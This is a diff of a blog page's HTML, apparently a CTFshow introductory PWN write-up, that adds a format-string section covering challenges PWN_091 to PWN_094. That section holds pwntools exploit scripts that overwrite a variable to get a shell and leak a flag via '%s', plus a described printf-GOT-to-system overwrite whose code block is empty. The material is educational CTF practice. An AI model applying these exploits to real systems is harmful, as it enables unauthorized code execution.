@@ -10,7 +10,7 @@
 <meta property='og:description' content="二进制漏洞与利用，PWN入门_wrtieup，会员套餐360题">
 <meta property='og:url' content='https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/'>
 <meta property='og:site_name' content='Expl0rer.Ct'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-06T00:50:58&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/ctfshow.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-11T18:21:04&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/ctfshow.png' />
 <meta name="twitter:title" content="CTFshow-入门PWN-writeup">
 <meta name="twitter:description" content="二进制漏洞与利用，PWN入门_wrtieup，会员套餐360题"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/ctfshow.png' />
@@ -736,11 +736,7 @@ unicode: "ece7"
   <ol>
     <li><a href="#test_your_nc">Test_your_nc</a>
       <ol>
-        <li><a href="#pwn_000">PWN_000</a>
-          <ol>
-            <li><a href="#解题过程">解题过程</a></li>
-          </ol>
-        </li>
+        <li><a href="#pwn_000">PWN_000</a></li>
         <li><a href="#pwn_001">PWN_001</a></li>
         <li><a href="#pwn_002">PWN_002</a></li>
         <li><a href="#pwn_003">PWN_003</a></li>
@@ -875,6 +871,14 @@ unicode: "ece7"
         <li><a href="#pwn_077">PWN_077</a></li>
       </ol>
     </li>
+    <li><a href="#格式化字符串">格式化字符串</a>
+      <ol>
+        <li><a href="#pwn_091">PWN_091</a></li>
+        <li><a href="#pwn_092">PWN_092</a></li>
+        <li><a href="#pwn_093">PWN_093</a></li>
+        <li><a href="#pwn_094">PWN_094</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -973,8 +977,8 @@ unicode: "ece7"
     >专用虚拟机镜像</a>，全套在这里，提取码show；虚拟机镜像，用户名为ctfshow，密码是ctfshow。</p>
 <p>看了课也啥都不会或者工具不会下看这&ndash;&gt;<a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/environment/"  target="_blank" rel="noopener"
     >CTF Wiki-PWN</a></p>
-<h4 id="解题过程">解题过程
-</h4><p>ssh连接（记得给虚拟机kali\Ubuntu或者主机设置打开SSH）：</p>
+<p>解题过程：</p>
+<p>ssh连接（记得给虚拟机kali\Ubuntu或者主机设置打开SSH）：</p>
 <p><code>ssh ctfshow@pwn.challenge.ctf.show -pxxxx</code></p>
 <p>一开始会让你输入yes/no的，直接yes，然后输入密码，等进程结束会有个交互shell</p>
 <p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/1.png"
@@ -10142,7 +10146,251 @@ unicode: "ece7"
 </div>
 </div><h3 id="pwn_077">PWN_077
 </h3><p>题目：Ez ROP or Mid ROP ? <a class="link" href="PWN_077" >PWN_077</a></p>
-
+<h2 id="格式化字符串">格式化字符串
+</h2><h3 id="pwn_091">PWN_091
+</h3><p>题目：开始格式化字符串了，先来个简单的吧。 <a class="link" href="PWN_091" >PWN_091</a></p>
+<p>checksec：</p>
+<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/299.png"
+	width="655"
+	height="214"
+	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/299_hu_116edf3822c1c0f5.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/299_hu_52a23015b46c02f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="306"
+		data-flex-basis="734px"
+	
+></p>
+<p>32位关闭PIE，部分开启RELRO；格式化字符串漏洞。</p>
+<p>IDA32位分析：</p>
+<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/300.png"
+	width="809"
+	height="246"
+	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/300_hu_8c7448c62fc1fcf5.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/300_hu_b10548d439565735.png 1024w"
+	loading="lazy"
+	
+		alt="main函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="328"
+		data-flex-basis="789px"
+	
+></p>
+<p>也就是说让daniu等于6时就会执行后门函数；跟进ctfshow函数：</p>
+<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/301.png"
+	width="800"
+	height="259"
+	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/301_hu_6bc3231d4ef6809.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/301_hu_63436fca9a5b5c14.png 1024w"
+	loading="lazy"
+	
+		alt="ctfshow函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="308"
+		data-flex-basis="741px"
+	
+></p>
+<p>可以看到这里的ptintf(s)明显的存在格式化字符串漏洞。</p>
+<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/302.png"
+	width="1010"
+	height="136"
+	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/302_hu_118dad0a88a9408a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/302_hu_efb9b8a436daf9c7.png 1024w"
+	loading="lazy"
+	
+		alt=".bss段:0x804B038"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="742"
+		data-flex-basis="1782px"
+	
+></p>
+<p>可以看到daniu变量存储在.bss段上，我们就需要利用格式化字符串漏洞去改写daniu的值从而getshell。</p>
+<p>测一下格式化字符串的偏移：</p>
+<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/303.png"
+	width="1644"
+	height="523"
+	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/303_hu_65a476a8786e9f1b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/303_hu_4b4e7a78a574fb6d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="314"
+		data-flex-basis="754px"
+	
+></p>
+<p>A的ASCII是41，也就是说格式化字符串的偏移量为7。</p>
+<p>再来验证一下：</p>
+<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/304.png"
+	width="1170"
+	height="494"
+	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/304_hu_d9980d7c9ba2b317.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/304_hu_17961b78369fec39.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="236"
+		data-flex-basis="568px"
+	
+></p>
+<p>我们需要让daniu = 6，现在又有格式化字符串漏洞，我们就可以使用其任意地址写功能将daniu的值修改为6即可获得shell。</p>
+<p>这里使用pwntools模块中的fmtstr模块直接进行改写：</p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span>  <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28270</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">daniu</span> <span class="o">=</span> <span class="mh">0x804B038</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,{</span><span class="n">daniu</span><span class="p">:</span><span class="mi">6</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的解题过程有些地方可能比较懵，这是正常的，可以去学习格式化字符串漏洞的原理：<a class="link" href="https://expl0rer.top/p/pwn-3/"  target="_blank" rel="noopener"
+    >PWN-3</a></p>
+<h3 id="pwn_092">PWN_092
+</h3><p>题目：可能上一题没太看懂？来看下基础吧。 <a class="link" href="PWN_092" >PWN_092</a></p>
+<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/305.png"
+	width="884"
+	height="199"
+	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/305_hu_86dd0480f8a6f182.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/305_hu_2897cbf90f534931.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="444"
+		data-flex-basis="1066px"
+	
+></p>
+<p>64位保护全开。</p>
+<p>IDA分析：</p>
+<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/306.png"
+	width="854"
+	height="425"
+	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/306_hu_24fea2b86a1e5670.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/306_hu_6f868b64f36d4b1c.png 1024w"
+	loading="lazy"
+	
+		alt="flagishere函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="200"
+		data-flex-basis="482px"
+	
+></p>
+<p>C语言学得好就知道这里有个格式化字符串漏洞了，我们看到<code>printf(format, s);</code>这个flagishere函数的流程是用scanf函数获取你输入的东西，赋值到format参数进去，然后这个s是存储flag的，如果你输入一个<code>&quot;%s&quot;</code>就构成了<code>printf(&quot;%s&quot;,s);</code>这就让程序吐出flag了。</p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span>  <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28204</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pwn_093">PWN_093
+</h3><p>题目：emmm，再来一道基础原理？ <a class="link" href="PWN_093" >PWN_093</a></p>
+<p>checksec完后IDA分析，找到了exit0函数有flag：</p>
+<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/307.png"
+	width="911"
+	height="351"
+	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/307_hu_5c468ace3281d5b9.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/307_hu_86ab92f2d2631f9c.png 1024w"
+	loading="lazy"
+	
+		alt="exit0函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="259"
+		data-flex-basis="622px"
+	
+></p>
+<p>这题很简单，输入7就有flag，但我们重在理解这道题，可以每个菜单都查看一下，了解FMT的原理（格式化字符串的偏移、计量值等等）。</p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span>  <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28283</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;7&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pwn_094">PWN_094
+</h3><p>题目：好了，你已经学会1+1=2了，接下来继续加油吧。 <a class="link" href="PWN_094" >PWN_094</a></p>
+<p>checksec：</p>
+<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/308.png"
+	width="918"
+	height="230"
+	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/308_hu_4711b42b5991fb54.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/308_hu_e5407c79929fe7c8.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="399"
+		data-flex-basis="957px"
+	
+></p>
+<p>32位开启NX，部分开启RELRO。</p>
+<p>IDA32位分析ctfshow函数：</p>
+<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/309.png"
+	width="685"
+	height="261"
+	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/309_hu_eeda70061047298e.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/309_hu_6b3ef1d3a4e5406.png 1024w"
+	loading="lazy"
+	
+		alt="ctfshow函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="262"
+		data-flex-basis="629px"
+	
+></p>
+<p>进入一个循环，然后其中有明显的格式化字符串漏洞；函数目录又找到一个sys函数：</p>
+<p><img src="310.png" alt="sys函数" style="zoom:150%;" />这也是一个格式化字符串漏洞，将printf@got 指针指向的地址改为 system@plt在printf(),就相当于system()了，然后借read函数将buf读进system里，这个buf我们可以输进<code>/bin/sh</code>，这就构成一个后门函数啦。</p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"></code></pre></td></tr></table>
+</div>
+</div>
 </section>
 
 
@@ -10159,7 +10407,7 @@ unicode: "ece7"
 
 
         <span>
-            最后更新于 2025-11-06
+            最后更新于 2025-11-11
         </span>
     </section></footer>
 
@@ -10204,23 +10452,47 @@ unicode: "ece7"
             
                 
 <article class="has-image">
-    <a href="/p/2025bjtuctf-pwn/">
+    <a href="/p/pwn-4/">
         
         
             <div class="article-image">
-                <img src="/p/2025bjtuctf-pwn/BJTUCTF.90f5cd42e21881be44253e37d54b6795_hu_13bcc8b29ab9b122.png" 
+                <img src="/p/pwn-4/PWN4.4afa5f5bde601dbc35b64aebcb8c25e3_hu_a61ad70f238c03c4.png" 
                         width="250" 
                         height="150" 
                         loading="lazy"
-                        alt="Featured image of post 2025BJTUCTF-PWN"
+                        alt="Featured image of post PWN-4"
                         
-                        data-hash="md5-kPXNQuIYgb5EJT431UtnlQ==">
+                        data-hash="md5-SvpfW95gHbw1tkrry4wl4w==">
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">2025BJTUCTF-PWN</h2>
+            <h2 class="article-title">PWN-4</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/pwn-3/">
+        
+        
+            <div class="article-image">
+                <img src="/p/pwn-3/PWN3.3657bbeb84fdb7f3290e78d3c41b8d4c_hu_d9ba59500c5360b4.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PWN-3"
+                        
+                        data-hash="md5-Nle764T9t/MpDnjTxBuNTA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PWN-3</h2>
         </div>
     </a>
 </article>
@@ -10232,13 +10504,13 @@ unicode: "ece7"
         
         
             <div class="article-image">
-                <img src="/p/%E7%BB%99pwn%E6%96%B0%E6%89%8B%E7%9A%84%E6%BA%A2%E5%87%BA%E9%AD%94%E6%B3%95%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/PWN%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.ee96c3422d2fcb13da9514744e2762a2_hu_179631d5777f326f.png" 
+                <img src="/p/%E7%BB%99pwn%E6%96%B0%E6%89%8B%E7%9A%84%E6%BA%A2%E5%87%BA%E9%AD%94%E6%B3%95%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/PWN%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.4c7e57113df2cad9ff15c86e749215fe_hu_f04fdb455264b7b2.png" 
                         width="250" 
                         height="150" 
                         loading="lazy"
                         alt="Featured image of post 给PWN新手的溢出魔法入门手册"
                         
-                        data-hash="md5-7pbDQi0vyxPalRR0Tidiog==">
+                        data-hash="md5-TH5XET3yytn/FchudJIV/g==">
                 
             </div>
         
@@ -10293,30 +10565,6 @@ unicode: "ece7"
 
         <div class="article-details">
             <h2 class="article-title">Moectf_2024</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/pwn-4/">
-        
-        
-            <div class="article-image">
-                <img src="/p/pwn-4/PWN4.3657bbeb84fdb7f3290e78d3c41b8d4c_hu_d9ba59500c5360b4.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post PWN-4"
-                        
-                        data-hash="md5-Nle764T9t/MpDnjTxBuNTA==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">PWN-4</h2>
         </div>
     </a>
 </article>
@@ -10444,13 +10692,11 @@ unicode: "ece7"
 
 
 
-
-
         
 <section class="wordcount">
   <div class="wordcount-row">
-    <p>博主发布了19篇文章  ||</p>
-    <p>总共252.71k 字</p>
+    <p>博主发布了18篇文章  ||</p>
+    <p>总共255.51k 字</p>
   </div>
 </section>
         
